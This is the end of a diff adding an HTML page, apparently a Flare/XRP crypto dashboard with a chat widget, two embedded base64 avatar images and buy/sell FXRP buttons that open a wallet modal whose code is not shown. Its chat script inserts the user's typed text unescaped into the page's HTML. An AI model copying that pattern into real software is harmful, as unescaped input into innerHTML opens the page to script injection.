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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div><div class="bbub">${html.replace(/\n/g,'<br>')}</div>`;
+  m.appendChild(d);m.scrollTop=m.scrollHeight;
+}
+function stt(){
+  const m=document.getElementById('cmsgs');
+  const d=document.createElement('div');d.className='mb';d.id='typ';
+  d.innerHTML=`<div class="bavs" style="padding:2px;"><img src="data:image/png;base64,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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div><div class="bbub"><div style="display:flex;gap:4px;align-items:center;padding:2px 0;"><div class="td"></div><div class="td"></div><div class="td"></div></div></div>`;
+  m.appendChild(d);m.scrollTop=m.scrollHeight;return d;
+}
+function sm(){
+  const i=document.getElementById('cin');const t=i.value.trim();if(!t)return;i.value='';
+  am(t,true);const ty=stt();
+  const r=R[t.toLowerCase()]||`Checking "<strong>${t}</strong>" across your XRP portfolio on Flare...\n\nTry: Best XRP APY · Mint FXRP guide · XRP airdrop · /price XRP · /claim XRP`;
+  setTimeout(()=>{ty.remove();am(r,false);},700+Math.random()*400);
+}
+function qa(t){document.getElementById('cin').value=t;sm();}
+function gp(id,btn){
+  document.querySelectorAll('.nt').forEach(b=>b.classList.remove('on'));
+  if(btn)btn.classList.add('on');
+  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
+  const p=document.getElementById('p-'+id);if(p){p.classList.add('on');p.parentElement.scrollTop=0;}
+}
+function setS(s){
+  const b=document.getElementById('sb'),sl=document.getElementById('ss'),ob=document.getElementById('ob');
+  if(s==='buy'){b.className='stab bon';sl.className='stab';ob.className='obtn buyb';ob.textContent='Buy FXRP';ob.onclick=showWalletModal;}
+  else{sl.className='stab son';b.className='stab';ob.className='obtn sellb';ob.textContent='Sell FXRP';ob.onclick=showWalletModal;}
+}
+</script>
+</body>
+</html>
